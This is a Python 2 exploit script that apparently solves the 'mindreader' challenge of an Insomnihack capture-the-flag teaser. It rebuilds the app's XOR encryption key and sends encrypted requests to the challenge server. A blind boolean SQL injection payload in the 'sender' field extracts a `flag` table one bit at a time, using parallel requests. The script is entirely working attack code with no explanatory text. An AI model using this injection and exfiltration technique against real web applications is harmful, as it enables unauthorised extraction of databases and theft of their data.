import requests
import struct
import urllib
import json
import random
import time

from itertools import cycle
from multiprocessing import Pool

key = struct.pack("<L", 0xB1342C3A)
key2 = [52, 81, 100, 75, 117, 88, 74, 70, 102, 51, 51, 83, 76, 112, 112, 83, 53, 106, 122, 110, 53, 86, 112, 81, 65, 105, 83, 106, 75, 117, 89, 104, 69, 55, 116, 113, 56, 90, 85, 82, 106, 54, 90, 71, 51, 103, 117, 71, 88, 80, 118, 83, 110, 54, 117, 68, 97, 90, 105, 54, 69, 120, 115, 110, 102, 72, 112, 72, 54, 122, 69, 121, 102, 114, 113, 88, 120, 88, 111, 78]
key2_1 = [74, 89, 103, 55, 97, 86, 85, 71, 99, 78, 107, 56, 100, 74, 115, 122, 109, 76, 97, 102]

counter2 = 0
for i in range(4):
	counter = 0
	for j in range(20):
		key2[j + i * 20] ^= key2_1[(counter + counter2) % 20]
		counter += 3
	counter2 += 60
def go(request):
	action, payload = request
	data = urllib.quote(encrypt(json.dumps(payload)))
	r = requests.get('http://mindreader.teaser.insomnihack.ch/?a=%d&c=%s' % (action, data))
	return 'succeed' in r.text

def encrypt(data):
	r = ''
	for x, y, z in zip(cycle(key), cycle(key2), data):
		r += chr(ord(x) ^ y ^ ord(z))
	return r.encode('base64').replace('\n', '')

if __name__ == '__main__':
	delay = 1
	r = []
	deviceId = ("00000000%d" % random.getrandbits(16)).ljust(15)
	pool = Pool(8)
	for j in range(100):
		r.append(0)
		objs = []
		for i in range(8):
			obj = {
				"device": deviceId,
				"date": "2015-05-05 11/11/11",
				"sender": "'+ (ascii(substr((select group_concat(`value`) from `flag`), %d, 1))&%d or (1-~0)) +'" % (j + 1, 1 << i),
				"body": "z" * 160
			}
			objs.append((2, obj))
		for i, c in enumerate(pool.map(go, objs)):
			if c:
				r[j] |= 1 << i
		print `bytearray(r)`